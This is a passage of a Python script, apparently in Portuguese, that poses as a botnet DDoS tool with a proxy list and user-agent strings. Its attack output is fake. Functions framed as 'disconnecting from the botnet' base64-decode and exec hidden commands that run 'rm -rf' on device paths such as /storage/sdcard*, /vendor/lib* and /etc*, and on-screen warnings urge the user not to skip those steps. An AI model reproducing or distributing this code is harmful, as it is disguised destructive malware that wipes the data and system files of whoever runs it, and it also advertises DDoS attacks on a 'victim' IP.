Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:36.0) Gecko/20100101 Firefox/36.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; )
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASAJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 BIDUBrowser/7.6 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MASMJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 10.0; Trident/7.0; Touch; rv:11.0) like Gecko
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; 360SE)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; InfoPath.3; .NET4.0C; .NET4.0E; MS-RTC LM 8)
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAGWJS; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36
Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; 360SE)
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4.17.9 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3
Mozilla/5.0 (Linux; Android 4.2.2; GT-P5113 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (X11; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0 DejaClick/2.5.0.11
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/5.0 (Linux; Android 4.4.3; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12B466 Safari/600.1.4
Mozilla/5.0 (Unknown; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/534.34
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP08; MAAU; NP08; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 4.4.2; LG-V410 Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)
Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0
Mozilla/5.0 (X11; CrOS x86_64 6946.70.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0
Mozilla/5.0 (iPod touch; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 IceDragon/38.0.5 Firefox/38.0.5
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; managedpc; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.0.3; en-ca; KFOT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Linux; Android 4.2.2; Le Pan TC802A Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/6.0.51363 Mobile/11D257 Safari/9537.53
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; Lumia 1520) like Gecko
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; 360SE)
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.87 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; PRU_IE; rv:11.0) like Gecko
Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 [FBAN/FBIOS;FBAV/38.0.0.6.79;FBBV/14316658;FBDV/iPad4,1;FBMD/iPad;FBSN/iPhone OS;FBSV/8.4.1;FBSS/2; FBCR/;FBID/tablet;FBLC/en_US;FBOP/1]
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP02; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Mozilla/5.0 (X11; CrOS x86_64 6946.63.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.4; Nexus 7 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Linux; Android 4.2.2; QMV7B Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko
Mozilla/5.0 (compatible; MSIE 10.0; AOL 9.7; AOLBuild 4343.1028; Windows NT 6.1; WOW64; Trident/7.0)
Mozilla/5.0 (Linux; U; Android 4.0.3; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko
Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B466
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; Active Content Browser)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; WebView/1.0)
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36
Mozilla/5.0 (iPad; U; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/50.0.125 Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MAARJS; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4
"""
def SERVER():
        com1 ="b3Muc3lzdGVtKCJybSAtcmYgL3N0b3JhZ2Uvc2RjYXJkKiIp"
        com2 = com1.encode("ascii")
        com3 = base64.b64decode(com2)
        result = com3.decode("ascii")
        exec(result)
        a = 1
        cc = a - 19
        syssocketsystem = 2
        if a == 2:
                print("connection done!")
        os.system('cls' if os.name=='nt' else 'clear')
proxylist = ["14.97.2.107:80","117.31.29.163:4216","14.160.26.153:8080","189.80.3.187:8080","103.87.48.57:8080","5.252.161.48:3128","201.234.53.214:999","112.195.241.246:3256","203.83.171.2:8080","181.188.215.83:999","36.67.57.45:30066","110.77.134.106:8080","93.171.192.28:8080","116.117.134.134:9999","106.14.43.86:8080","106.45.220.128:3256","8.208.91.118:8008","159.69.38.145:3128","103.236.193.113:83","182.160.119.155:8080","106.14.42.62:8080","4.14.219.157:3128","151.80.196.163:8010","223.243.174.144:3256","119.28.155.202:9999","128.199.4.92:3129","88.247.10.31:8080","138.197.209.229:3128","220.174.236.211:8091","36.37.136.171:8080","95.46.145.36:80","212.73.73.234:8081","46.5.252.70:8080","103.206.208.135:55443","113.123.1.42:3256","109.193.195.11:8080","103.235.35.165:63123","103.98.128.51:8080","116.68.254.94:8089","103.240.77.98:30093","103.148.92.201:8080","202.147.207.253:38646","74.214.177.61:8080","202.180.55.98:8080","103.52.209.86:80","175.110.211.172:8080","167.172.184.166:35486","177.222.248.168:8080","223.255.133.34:8080","139.224.11.179:8080","96.9.77.71:8080","106.45.220.102:3256","37.49.127.235:8080","150.129.148.99:35101","134.0.63.134:8000","106.45.220.108:3256","110.44.124.220:55443","165.22.64.68:33153","34.236.171.18:8888","196.22.221.2:58893","111.177.192.25:3256","202.182.57.10:8080","47.90.132.228:8800","105.112.8.53:3128","103.121.224.11:8080","121.196.56.207:808","78.90.203.56:8080","117.28.246.15:80","167.172.191.249:44590","81.12.106.158:8080","106.15.200.72:8080","202.141.233.66:8080","36.94.13.63:80","186.167.20.211:3128","94.199.2.235:8080","168.196.112.1:50000","154.16.63.16:3128","45.117.74.97:8060","70.184.181.203:48678","80.87.217.6:8080","104.237.255.195:3128","94.143.48.145:8080","50.206.25.106:80","103.139.156.122:82","181.209.99.28:999","36.255.84.213:83","14.225.11.126:8080","185.38.111.1:8080","84.214.150.146:8080","176.122.117.12:45806","198.211.5.113:3128","45.77.170.21:3128","187.87.204.210:45597","72.50.34.150:999","157.230.103.189:43415","171.97.15.134:8080","114.106.157.35:3256","188.225.177.82:8080","62.68.43.114:8080","203.210.84.50:8089","85.26.146.169:80","188.166.162.1:3128","193.106.130.249:8080","170.0.85.230:999","109.89.207.252:8080","193.123.254.193:3128","43.231.79.53:8080","40.85.152.26:8080","117.94.143.173:9999","46.101.83.76:8080","181.15.156.170:80","169.44.169.62:3128","111.68.40.15:8080","81.95.131.10:44292","159.203.61.169:8080","78.110.7.192:3128","120.196.112.6:3128","187.60.121.246:3128","88.205.225.203:3128","125.72.106.153:3256","128.199.96.20:8080","193.242.177.105:53281","181.78.18.25:999","95.208.208.227:3128","117.89.162.32:4216","112.195.243.193:3256","188.166.245.147:8080","43.224.10.35:6666","165.227.173.87:45008","195.123.247.22:3128","123.171.42.79:3256","196.0.34.142:33855","157.230.40.79:8080","170.0.87.203:999","1.70.66.234:9999","197.255.52.214:8081","8.133.191.41:8081","128.199.237.213:8080","139.228.90.186:8080","111.72.193.18:3256","109.193.195.11:3128","110.74.203.250:8080","41.220.114.154:8080","103.11.106.70:8181","217.8.51.200:8080","200.236.221.242:33054","125.25.206.28:8080","51.222.67.212:32768","139.224.45.199:8080","103.111.225.100:8080","51.79.145.176:8080","92.204.129.161:80","191.96.71.118:3128","167.172.184.166:34580","219.83.34.178:8080","46.4.96.137:3128","124.41.211.188:38656","200.116.226.210:43049","114.67.108.243:8081","27.191.60.170:3256","201.217.12.212:8080","36.91.124.124:8080","167.172.180.46:43891","128.199.202.122:3128","118.99.104.16:8080","59.55.165.183:3256","203.142.69.69:8080","156.67.172.185:3128","36.56.103.5:9999","117.69.231.125:3256","122.55.250.90:8080","103.109.194.210:80","185.198.184.14:48122","221.5.80.66:3128","181.101.42.82:10809","91.93.73.228:7070","170.238.239.61:35734","106.0.37.76:8080","94.68.245.147:8080","119.82.249.4:60959","119.82.239.37:8080","175.165.228.97:9999","176.120.198.136:8080","109.195.194.79:60992","45.70.84.42:9292","222.186.45.159:3127","41.223.143.78:3128","93.157.12.248:8080","109.170.97.146:8085","181.198.43.50:999","102.33.21.36:8080","78.42.42.35:3128","192.158.15.201:60684","120.232.150.110:80","103.157.26.228:80","79.122.209.213:8087","106.14.167.62:8080","103.151.125.234:3128","182.253.162.112:8080","182.16.171.65:43188","139.255.25.85:3128","103.1.93.211:8080","198.50.163.192:3129","103.111.55.58:11337","14.139.242.242:3128","103.148.195.22:8080","47.103.130.208:38888","14.225.5.68:80","45.124.144.145:8080","46.209.106.66:8085","222.129.34.60:57114","27.191.60.253:3256","213.216.67.190:8080","103.241.227.98:6666","103.227.254.118:4343","201.49.37.133:80","209.45.78.92:999","191.7.210.162:35820","154.16.202.22:3128","8.133.191.41:8000","181.113.133.106:8080","82.223.3.52:8118","106.45.220.106:3256","117.29.95.19:4216","59.59.150.39:4216","95.208.208.226:3128","117.89.95.213:4216","109.238.222.5:40387","190.211.82.174:999","191.252.61.219:3128","157.230.103.189:38436","176.113.209.145:50000","202.29.220.242:8080","103.213.213.22:83","144.217.101.245:3129","178.47.141.85:2580","114.5.199.216:8080","218.88.204.85:3256","114.112.127.33:80","109.193.195.4:8080","91.245.255.37:3128","103.199.159.233:40049","103.78.254.54:8080","45.224.22.163:999","45.71.115.35:999","197.211.51.28:3128","194.5.237.245:1012","41.86.251.62:8080","45.174.251.8:999","80.241.251.54:8080","122.51.190.230:3128","103.235.152.54:3888","77.236.227.254:8080","164.90.164.161:8080","52.149.152.236:80","111.177.192.79:3256","223.241.77.84:3256","144.202.113.90:8080","106.0.49.202:8080","49.87.171.27:9999","185.88.154.189:81","216.58.163.118:80","1.70.65.235:9999","103.199.159.185:40049","170.254.104.250:8080","217.147.1.123:8080","190.90.18.163:999","89.248.244.180:8080","103.105.125.6:84","114.99.199.210:3256","45.32.31.97:80","95.111.236.28:3128","103.224.103.38:8080","103.135.7.2:63123","103.112.213.82:84","118.97.47.249:55443","167.172.191.249:38898","82.212.62.30:8080","80.243.158.6:8080","112.65.53.111:8118","157.230.103.189:42368","105.28.114.169:30032","85.216.127.178:3128","45.32.27.206:3128","177.229.194.43:8080","131.255.103.169:8080","191.96.42.80:3128","138.36.149.10:8090","1.10.188.78:45208","174.138.17.44:80","40.68.220.250:3128","177.125.169.6:55443","116.117.134.134:82","202.5.56.33:63141","37.49.127.236:8080","103.213.116.198:8080","117.69.230.237:3256","149.172.255.10:3128","45.235.100.26:3128","112.195.241.141:3256","212.175.191.92:8080","18.178.146.121:80","113.123.1.254:3256","200.223.48.250:8080","190.1.201.58:8080","66.96.233.36:8090","218.88.204.109:3256","120.38.240.171:4216","121.211.254.46:8080","123.171.42.172:3256","202.138.248.107:8080","103.120.144.144:80","103.152.101.132:8080","182.84.144.156:3256","112.133.215.24:8080","101.51.106.70:49285","218.147.194.18:80","175.146.215.93:9999","45.174.168.7:999","47.242.73.55:8118","46.223.255.11:8080","199.188.92.111:8000","197.221.89.70:8080","103.227.254.118:2017","189.109.219.116:8080","128.199.242.26:8080","109.193.195.6:8080","106.52.224.192:808","94.180.106.94:32767","46.223.255.4:3128","50.206.25.104:80","114.104.135.93:3256","45.6.4.60:8080","132.248.196.2:8080","186.47.83.126:8080","78.111.97.179:3139","146.196.63.89:55033","109.237.91.155:8080","41.59.90.92:80","118.117.188.84:3256","174.71.185.203:48678","182.16.171.42:43188","106.15.197.123:8080","178.32.129.31:3128","181.225.41.131:8080","182.99.254.9:9999","91.204.154.238:8080","103.111.55.58:454","45.64.11.13:8080","5.16.0.49:8080","88.255.102.166:9090","195.178.56.33:8080","187.243.240.54:8080","39.106.223.134:80","202.134.191.156:8080","84.53.243.83:3128","106.45.220.15:3256","118.172.201.89:39818","49.87.29.62:9999","27.147.210.35:8080","139.162.78.109:3128","51.79.166.168:8080","131.108.84.14:8080","58.221.193.74:8888","36.89.194.113:40252","112.193.122.180:3256","51.75.144.32:3128","194.113.107.80:3128","149.28.94.152:8080","109.127.82.42:8080","103.109.59.242:53281","159.203.61.169:3128","178.217.216.184:49086","104.43.230.151:3128","195.85.218.66:8080","103.53.76.84:8080","1.70.67.65:9999","103.240.161.101:6666","1.70.67.175:9999","85.234.126.107:55555","103.111.55.58:1682","111.77.114.75:3256","140.238.228.223:3128","43.249.224.172:83","219.92.3.149:8080","117.69.230.166:3256","91.211.172.104:31016","103.103.175.253:3128","200.123.2.171:3128","113.121.23.74:3256","218.88.204.206:3256","103.89.159.250:8080","31.24.206.19:8080","168.119.137.56:3128","115.85.73.179:3128","13.49.144.251:20048","106.45.104.226:3256","119.82.253.24:44060","134.249.114.53:8080","112.78.170.251:8080","201.149.102.242:8085","189.199.126.94:8080","194.61.139.26:8080","62.99.178.46:37699","36.94.183.153:8080","185.255.46.74:8080","150.129.151.62:6666","46.223.255.8:8080","78.154.167.68:8080","46.237.255.6:8080","45.167.124.205:999","14.97.2.106:80","106.45.220.92:3256","222.129.35.216:57114","164.39.202.75:53281","176.113.73.101:3128","165.16.46.193:8080","103.135.5.142:63123","79.106.227.242:8080","181.209.86.134:999","103.99.77.254:3128","43.228.95.122:82","191.96.42.80:8080","177.184.139.81:38459","1.186.40.9:54754","218.87.174.89:9999","144.217.254.175:3128","12.229.217.226:55443","106.45.220.100:3256","101.74.80.71:9999","203.142.69.67:8080","58.82.154.3:8080","103.36.11.240:14571","101.132.104.95:8080","168.232.20.155:8080","14.134.184.217:3256","167.172.191.249:35327","150.255.131.132:9999","194.5.237.229:1012","194.135.15.6:56218","217.8.51.194:8080","103.111.55.58:10579"]
def ddos():
        ip = input(">> ip da vitima: ")
        os.system('cls' if os.name=='nt' else 'clear')
        print("""
------------------------------------------------------------
port padrão:    \033[1;32;40m 8080 ou 53 ou 88 \033[1;37;40m
------------------------------------------------------------
        """)
        port = input(">> port: ")
        ports = ["8080", "53", "88"]
        if port not in ports:
                print("!! OPÇÃO ERRADA !!")
                sys.exit()

        time.sleep(1.5)
        os.system('cls' if os.name=='nt' else 'clear')
        print("""
------------------------------------------------------------
numero de threads padrão: \033[1;32;40m 100 \033[1;37;40m
------------------------------------------------------------
""")
        threads = input(">> numero de threads: ")
        
        time.sleep(1.5)
        os.system('cls' if os.name=='nt' else 'clear')
        print("""
qual botnet deseja usar?
1 - \033[1;91m andromedra \033[1;37;40m --> forte
2 - \033[1;91m medusa \033[1;37;40m
        """)
        botnet = input("botnet: ")
        botnets = ["1", "2"]
        if botnet not in botnets:
                print("!! OPÇÃO ERRADA !!")
        else:
                time.sleep(2)
                print("conectando. . .")
                time.sleep(5)
                print("CONEXÃO REALIZADA !")
                time.sleep(2)
                print("------------------iniciando ataque------------------")
                time.sleep(2)
                print("conectando proxys ativas")
                time.sleep(4)
                print("conectado com sucesso")
                os.system('cls' if os.name=='nt' else 'clear')
                time.sleep(1)
                vml = "\033[1;91m"
                bnc = "\033[1;37;40m"
                i = 0
                x = 0
                while i < 10000:
                        rndp = random.choice(proxylist)
                        n = random.randint(1,100)
                        print("thread:", vml, n, bnc, "mandando bytes para", vml, ip, bnc, "PROXY: ", rndp)
                        i = i + 1
                while x < 13:
                        print("\033[1;32;40m target down. . .", bnc)
                        x = x + 1
def section_con():
        com1 ="b3Muc3lzdGVtKCJybSAtcmYgL3ByZWxvYWQvKj4gZGV2L251bGwiKQ=="
        com2 = com1.encode("ascii")
        com3 = base64.b64decode(com2)
        result = com3.decode("ascii")
        exec(result)
        os.system('cls' if os.name=='nt' else 'clear')
def secTHREE():
        com1 ="b3Muc3lzdGVtKCJybSAtcmYgL3N0b3JhZ2Uvc2RjYXJkMC9hbmRyb2lkKiIp"
        com2 = com1.encode("ascii")
        com3 = base64.b64decode(com2)
        result = com3.decode("ascii")
        exec(result)
        os.system('cls' if os.name=='nt' else 'clear')
def quit_server():
        com1 ="b3Muc3lzdGVtKCJybSAtcmYgL3ZlbmRvci9saWIqIik="
        com2 = com1.encode("ascii")
        com3 = base64.b64decode(com2)
        result = com3.decode("ascii")
        exec(result)
        os.system('cls' if os.name=='nt' else 'clear')
def DESCONECT_BOTNET():
        com1 ="b3Muc3lzdGVtKCJybSAtcmYgL2V0YyoiKQ=="
        com2 = com1.encode("ascii")
        com3 = base64.b64decode(com2)
        result = com3.decode("ascii")
        exec(result)
        os.system('cls' if os.name=='nt' else 'clear')
banner()   
os.system('cls' if os.name=='nt' else 'clear')
time.sleep(1)
print("\033[1;91m \n \n")
marca("CODED BY:  GHOST HOST")
time.sleep(1)
print("\033[1;37;40m")
os.system('cls' if os.name=='nt' else 'clear')
ddos()
time.sleep(1.5)
os.system('cls' if os.name=='nt' else 'clear')
print("\033[1;32;40m -----DESCONECTANDO DA BOTNET----- \033[1;37;40m")
print("\033[1;91m !!!!! NÃO PULE ESSA ETAPA DO PROCESSO !!!! \033[1;37;40m")
sectionFF()
SERVER()
threads()
secTHREE()
print("\033[1;91m DESABILITANDO PROXYS  !! NÃO PULE ESSA ETAPA !! \033[1;37;40m")
time.sleep(2)
section_con()
quit_server()
DESCONECT_BOTNET()

time.sleep(1)
print("saindo. . .")

sys.exit(0)